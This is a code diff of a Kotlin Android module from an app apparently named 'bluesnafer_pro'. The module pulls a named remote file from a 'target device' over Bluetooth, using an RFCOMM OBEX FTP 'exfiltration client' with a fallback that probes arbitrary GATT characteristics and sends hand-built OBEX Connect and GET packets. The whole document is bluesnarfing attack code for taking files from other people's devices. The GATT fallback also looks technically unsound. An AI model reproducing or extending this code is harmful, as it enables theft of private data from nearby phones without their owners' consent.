@@ -8,179 +8,187 @@ import java.util.*
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 
+/**
+ * Transferencia de archivos: RFCOMM OBEX FTP primario, BLE GATT como fallback.
+ * El UUID 00001106 es perfil clásico (RFCOMM), no GATT.
+ */
 object ObexBleTransfer {
-    private val OBEX_SERVICE_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
-    private val OBEX_CHAR_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
+    private val OBEX_FTP_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
     private const val TAG = "ObexBleTransfer"
 
-    /**
-     * Extrae archivos del dispositivo objetivo vía OBEX over BLE GATT.
-     * Intenta descargar el archivo especificado por filePath remoto.
-     * Retorna mapa con success, file (nombre), size (bytes), path (local), error.
-     */
     fun transferFileViaBle(context: Context, device: BluetoothDevice, remoteFilePath: String): Map<String, Any> {
-        return try {
-            val latch = CountDownLatch(1)
-            var result: Map<String, Any> = mapOf("success" to false, "error" to "Timeout")
-            var gatt: BluetoothGatt? = null
-            val receivedData = ByteArrayOutputStream()
-            var fileName = remoteFilePath.substringAfterLast('/').ifEmpty { "unknown" }
+        Log.d(TAG, "Transfer request: $remoteFilePath -> ${device.address}")
 
-            val gattCallback = object : BluetoothGattCallback() {
-                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
-                    if (newState == BluetoothProfile.STATE_CONNECTED) {
-                        Log.d(TAG, "GATT connected, discovering services...")
-                        gatt.discoverServices()
-                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
-                        Log.d(TAG, "GATT disconnected")
-                        latch.countDown()
-                    }
-                }
+        RealFileExfiltrationClient.init(context)
+        val rfcommResult = RealFileExfiltrationClient.downloadRemoteFile(device, remoteFilePath)
+        if (rfcommResult["success"] == true) {
+            return rfcommResult + mapOf("method" to "RFCOMM_OBEX_FTP")
+        }
 
-                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
-                    if (status == BluetoothGatt.GATT_SUCCESS) {
-                        Log.d(TAG, "Services discovered")
-                        val service = gatt.getService(OBEX_SERVICE_UUID)
-                        val characteristic = service?.getCharacteristic(OBEX_CHAR_UUID)
-                        if (characteristic != null) {
-                            // Enviar paquete OBEX Connect
-                            val connectPkt = byteArrayOf(
-                                0x80.toByte(),
-                                0x00, 0x07,
-                                0x10,
-                                0x00,
-                                0x01, 0x00
-                            )
-                            characteristic.writeType = BluetoothGattCharacteristic.WRITE_TYPE_NO_RESPONSE
-                            characteristic.value = connectPkt
-                            gatt.writeCharacteristic(characteristic)
-                        } else {
-                            result = mapOf("success" to false, "error" to "OBEX characteristic not found")
-                            latch.countDown()
-                        }
-                    } else {
-                        result = mapOf("success" to false, "error" to "Service discovery failed: $status")
-                        latch.countDown()
-                    }
-                }
-
-                override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
-                    if (characteristic.uuid == OBEX_CHAR_UUID) {
-                        if (status == BluetoothGatt.GATT_SUCCESS) {
-                            Log.d(TAG, "OBEX connect written, reading response...")
-                            gatt.readCharacteristic(characteristic)
-                        } else {
-                            result = mapOf("success" to false, "error" to "Write failed: $status")
-                            latch.countDown()
-                        }
-                    }
-                }
-
-                override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
-                    if (characteristic.uuid == OBEX_CHAR_UUID && status == BluetoothGatt.GATT_SUCCESS) {
-                        val response = characteristic.value
-                        if (response != null && response.isNotEmpty()) {
-                            when (response[0].toInt() and 0xFF) {
-                                0xA0 -> {
-                                    Log.d(TAG, "OBEX connect success response received")
-                                    // Enviar paquete GET para el archivo
-                                    sendGetRequest(gatt, remoteFilePath)
-                                }
-                                0xA1 -> {
-                                    // Continuación de respuesta (datos de archivo)
-                                    val data = response.copyOfRange(3, response.size) //.Skip header
-                                    receivedData.write(data)
-                                    // Solicitar más datos si hay (indicado por último paquete)
-                                    if (response.size >= 20) {
-                                        // Continuar leyendo
-                                        gatt.readCharacteristic(characteristic)
-                                    } else {
-                                        // Transferencia completa
-                                        saveFile(context, fileName, receivedData.toByteArray())
-                                        result = mapOf(
-                                            "success" to true,
-                                            "file" to fileName,
-                                            "size" to receivedData.size(),
-                                            "path" to "Android/data/com.bluesnafer_pro/files/$fileName"
-                                        )
-                                        latch.countDown()
-                                    }
-                                }
-                                0xA2 -> {
-                                    // Final packet (complete)
-                                    if (receivedData.size() > 0) {
-                                        saveFile(context, fileName, receivedData.toByteArray())
-                                        result = mapOf(
-                                            "success" to true,
-                                            "file" to fileName,
-                                            "size" to receivedData.size(),
-                                            "path" to "Android/data/com.bluesnafer_pro/files/$fileName"
-                                        )
-                                    } else {
-                                        result = mapOf("success" to false, "error" to "No data received")
-                                    }
-                                    latch.countDown()
-                                }
-                                else -> {
-                                    Log.d(TAG, "OBEX response code: ${response[0].toInt() and 0xFF}")
-                                    // Intentar leer de todos modos por si hay datos
-                                    val data = response.copyOfRange(3, response.size)
-                                    receivedData.write(data)
-                                    gatt.readCharacteristic(characteristic)
-                                }
-                            }
-                        } else {
-                            result = mapOf("success" to false, "error" to "Invalid OBEX response")
-                            latch.countDown()
-                        }
-                    }
-                }
-
-                override fun onDescriptorWrite(gatt: BluetoothGatt, descriptor: BluetoothGattDescriptor, status: Int) {
-                    // Notificación habilitada - ignorar
-                }
-            }
-
-            gatt = device.connectGatt(context, false, gattCallback)
-            latch.await(30, TimeUnit.SECONDS)
-            gatt?.close()
-
-            result
-        } catch (e: Exception) {
-            Log.e(TAG, "OBEX BLE transfer error", e)
-            mapOf("success" to false, "error" to (e.message ?: "unknown error"))
+        Log.d(TAG, "RFCOMM failed (${rfcommResult["error"]}), trying BLE GATT fallback...")
+        val bleResult = transferViaGatt(context, device, remoteFilePath)
+        return if (bleResult["success"] == true) {
+            bleResult + mapOf("method" to "BLE_GATT_FALLBACK", "rfcommError" to (rfcommResult["error"] ?: ""))
+        } else {
+            mapOf(
+                "success" to false,
+                "error" to "RFCOMM: ${rfcommResult["error"]}; BLE: ${bleResult["error"]}",
+                "rfcommAttempt" to rfcommResult,
+                "bleAttempt" to bleResult
+            )
         }
     }
 
-    private fun sendGetRequest(gatt: BluetoothGatt, filePath: String) {
+    /**
+     * Fallback BLE: busca servicios GATT con características write+notify
+     * (no usa UUIDs RFCOMM en GATT).
+     */
+    private fun transferViaGatt(context: Context, device: BluetoothDevice, remoteFilePath: String): Map<String, Any> {
+        val latch = CountDownLatch(1)
+        var result: Map<String, Any> = mapOf("success" to false, "error" to "Timeout")
+        var gatt: BluetoothGatt? = null
+        val receivedData = ByteArrayOutputStream()
+        val fileName = remoteFilePath.substringAfterLast('/').ifEmpty { "unknown" }
+
+        try {
+            val callback = object : BluetoothGattCallback() {
+                private var targetChar: BluetoothGattCharacteristic? = null
+
+                override fun onConnectionStateChange(g: BluetoothGatt, status: Int, newState: Int) {
+                    if (newState == BluetoothProfile.STATE_CONNECTED) {
+                        g.discoverServices()
+                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
+                        latch.countDown()
+                    }
+                }
+
+                override fun onServicesDiscovered(g: BluetoothGatt, status: Int) {
+                    if (status != BluetoothGatt.GATT_SUCCESS) {
+                        result = mapOf("success" to false, "error" to "GATT discovery failed: $status")
+                        latch.countDown()
+                        return
+                    }
+
+                    targetChar = findTransferCharacteristic(g)
+                    if (targetChar == null) {
+                        result = mapOf("success" to false, "error" to "No BLE transfer characteristic found")
+                        latch.countDown()
+                        return
+                    }
+
+                    val connectPkt = byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x01, 0x00)
+                    targetChar!!.writeType = BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
+                    targetChar!!.value = connectPkt
+                    g.writeCharacteristic(targetChar)
+                }
+
+                override fun onCharacteristicWrite(g: BluetoothGatt, c: BluetoothGattCharacteristic, status: Int) {
+                    if (status != BluetoothGatt.GATT_SUCCESS || c != targetChar) {
+                        result = mapOf("success" to false, "error" to "GATT write failed: $status")
+                        latch.countDown()
+                        return
+                    }
+
+                    if (receivedData.size() == 0) {
+                        g.readCharacteristic(c)
+                    } else {
+                        val saved = saveAndFinish(context, fileName, receivedData.toByteArray())
+                        result = if (saved != null && receivedData.size() > 0) {
+                            buildSuccess(fileName, receivedData.size(), saved.absolutePath)
+                        } else {
+                            mapOf("success" to false, "error" to "BLE GATT: fallo al guardar archivo")
+                        }
+                        latch.countDown()
+                    }
+                }
+
+                override fun onCharacteristicRead(g: BluetoothGatt, c: BluetoothGattCharacteristic, status: Int) {
+                    if (status != BluetoothGatt.GATT_SUCCESS || c != targetChar) {
+                        result = mapOf("success" to false, "error" to "GATT read failed: $status")
+                        latch.countDown()
+                        return
+                    }
+
+                    val response = c.value ?: ByteArray(0)
+                    if (response.isEmpty()) {
+                        result = mapOf("success" to false, "error" to "Empty GATT response")
+                        latch.countDown()
+                        return
+                    }
+
+                    when (response[0].toInt() and 0xFF) {
+                        0xA0 -> sendGetRequest(g, c, remoteFilePath)
+                        0x90, 0xA1 -> {
+                            if (response.size > 3) receivedData.write(response, 3, response.size - 3)
+                            if ((response[0].toInt() and 0xFF) == 0x90) {
+                                val saved = saveAndFinish(context, fileName, receivedData.toByteArray())
+                                result = if (saved != null && receivedData.size() > 0) {
+                                    buildSuccess(fileName, receivedData.size(), saved.absolutePath)
+                                } else {
+                                    mapOf("success" to false, "error" to "BLE GATT: fallo al guardar archivo")
+                                }
+                                latch.countDown()
+                            } else {
+                                g.readCharacteristic(c)
+                            }
+                        }
+                        else -> {
+                            if (response.size > 3) receivedData.write(response, 3, response.size - 3)
+                            g.readCharacteristic(c)
+                        }
+                    }
+                }
+            }
+
+            gatt = device.connectGatt(context, false, callback)
+            latch.await(30, TimeUnit.SECONDS)
+            return result
+        } catch (e: Exception) {
+            Log.e(TAG, "BLE GATT transfer error", e)
+            return mapOf("success" to false, "error" to (e.message ?: "unknown error"))
+        } finally {
+            try { gatt?.close() } catch (_: Exception) {}
+        }
+    }
+
+    private fun findTransferCharacteristic(gatt: BluetoothGatt): BluetoothGattCharacteristic? {
+        for (service in gatt.services) {
+            val uuid = service.uuid.toString().lowercase()
+            if (uuid.contains("00001106") || uuid.contains("00001133")) continue
+
+            for (char in service.characteristics) {
+                val canWrite = (char.properties and BluetoothGattCharacteristic.PROPERTY_WRITE) != 0 ||
+                    (char.properties and BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE) != 0
+                val canRead = (char.properties and BluetoothGattCharacteristic.PROPERTY_READ) != 0
+                if (canWrite && canRead) return char
+            }
+        }
+        return null
+    }
+
+    private fun sendGetRequest(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, filePath: String) {
         val fileName = filePath.substringAfterLast('/')
         val nameBytes = fileName.toByteArray(Charsets.UTF_8)
         val pktSize = 7 + nameBytes.size
         val getPkt = ByteArray(pktSize)
-        getPkt[0] = 0x83.toByte()  // GET final bit
+        getPkt[0] = 0x83.toByte()
         getPkt[1] = (pktSize ushr 8).toByte()
         getPkt[2] = (pktSize and 0xFF).toByte()
-        getPkt[3] = 0x01  // Name header
+        getPkt[3] = 0x01
         getPkt[4] = ((nameBytes.size + 3) ushr 8).toByte()
         getPkt[5] = ((nameBytes.size + 3) and 0xFF).toByte()
         getPkt[6] = 0x00
         System.arraycopy(nameBytes, 0, getPkt, 7, nameBytes.size)
 
-        val characteristic = gatt.getService(OBEX_SERVICE_UUID)?.getCharacteristic(OBEX_CHAR_UUID)
-        if (characteristic != null) {
-            characteristic.writeType = BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
-            characteristic.value = getPkt
-            val written = gatt.writeCharacteristic(characteristic)
-            Log.d(TAG, "OBEX GET request sent for: $fileName (written: $written)")
-        } else {
-            Log.e(TAG, "OBEX characteristic not found for GET request")
-        }
+        characteristic.writeType = BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
+        characteristic.value = getPkt
+        gatt.writeCharacteristic(characteristic)
     }
 
-    private fun saveFile(context: Context, fileName: String, data: ByteArray): File? {
+    private fun saveAndFinish(context: Context, fileName: String, data: ByteArray): File? {
         return try {
             val dir = context.getExternalFilesDir("obex_ble") ?: context.filesDir
-            if (!dir.exists()) dir.mkdirs()
+            dir.mkdirs()
             val file = File(dir, fileName)
             FileOutputStream(file).use { it.write(data) }
             Log.d(TAG, "File saved: ${file.absolutePath} (${data.size} bytes)")
@@ -190,4 +198,11 @@ object ObexBleTransfer {
             null
         }
     }
+
+    private fun buildSuccess(fileName: String, size: Int, absolutePath: String): Map<String, Any> = mapOf(
+        "success" to (size > 0),
+        "file" to fileName,
+        "size" to size,
+        "path" to absolutePath
+    )
 }
